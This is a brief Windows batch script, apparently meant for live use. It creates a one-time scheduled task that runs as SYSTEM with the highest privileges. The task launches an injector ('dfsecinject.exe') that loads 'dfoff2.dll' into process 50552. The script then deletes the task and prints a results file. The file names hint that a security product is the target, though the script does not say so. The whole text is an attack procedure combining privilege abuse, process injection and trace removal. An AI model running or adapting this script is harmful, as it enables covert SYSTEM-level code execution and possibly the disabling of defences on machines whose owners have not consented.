@echo off
cd /d C:\Users\User\trackA
dir dfsecinject.exe dfoff2.dll
schtasks /create /tn dfa_off2 /tr "C:\Users\User\trackA\dfsecinject.exe 50552 C:\Users\User\trackA\dfoff2.dll" /sc once /st 00:00 /ru SYSTEM /rl HIGHEST /f
schtasks /run /tn dfa_off2
timeout /t 6 >nul
schtasks /delete /tn dfa_off2 /f
type off2.txt
